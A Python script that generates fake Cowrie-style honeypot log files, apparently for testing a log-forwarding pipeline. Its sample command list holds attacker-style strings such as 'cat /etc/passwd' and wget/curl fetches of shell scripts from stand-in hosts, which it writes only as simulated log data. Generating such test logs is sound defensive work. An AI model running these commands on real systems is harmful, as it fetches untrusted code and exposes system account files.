#!/usr/bin/env python3
"""
Generate N fake Cowrie-style JSON log files in honeypot/cowrie/log.
Each file is a single JSON object similar to the test_sample.json you used.
Usage: python3 generate_fake_logs.py <N> <optional-start-ip>
"""
import sys, os, json, random, time
from datetime import datetime, timedelta

OUT_DIR = os.path.expanduser(os.path.join(os.path.dirname(__file__), '..', 'honeypot', 'cowrie', 'log'))
os.makedirs(OUT_DIR, exist_ok=True)

def random_ip(base=None):
    if base:
        # increment base's last octet
        parts = base.split('.')
        last = (int(parts[-1]) + random.randint(0,200)) % 254 + 1
        parts[-1] = str(last)
        return '.'.join(parts)
    return "{}.{}.{}.{}".format(random.randint(1,223), random.randint(0,255), random.randint(0,255), random.randint(1,254))

EVENT_TYPES = ["login_attempt","command","download","connect","shell"]
COMMANDS = ["ls -la", "whoami", "id", "pwd", "uname -a", "cat /etc/passwd","wget http://malicious/x.sh","curl http://example/x"]

def make_event(i, ip_base=None):
    now = datetime.utcnow() - timedelta(minutes=random.randint(0,60))
    src = random_ip(ip_base)
    ev = {
        "timestamp": now.isoformat() + "Z",
        "src_ip": src,
        "event": random.choice(EVENT_TYPES),
        "input": random.choice(COMMANDS) if random.random() < 0.6 else "",
        "session": f"{src}-{int(time.time())}-{i}"
    }
    # add a little variety
    if ev["event"] == "login_attempt":
        ev["username"] = random.choice(["root","admin","user","test"])
        ev["password"] = random.choice(["1234","password","admin","toor","letmein",""])
    if ev["event"] == "download":
        ev["url"] = "http://example.com/" + str(random.randint(1,100)) + ".sh"
    return ev

def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 200
    base_ip = sys.argv[2] if len(sys.argv) > 2 else None
    for i in range(1, n+1):
        ev = make_event(i, base_ip)
        fname = os.path.join(OUT_DIR, f"fake_event_{int(time.time())}_{i}.json")
        # write atomically
        with open(fname + ".tmp", "w") as f:
            json.dump(ev, f)
        os.replace(fname + ".tmp", fname)
        # small jitter so forwarder notices new files as separate events
        time.sleep(0.01)
    print(f"Wrote {n} fake JSON files to {OUT_DIR}")

if __name__ == "__main__":
    main()
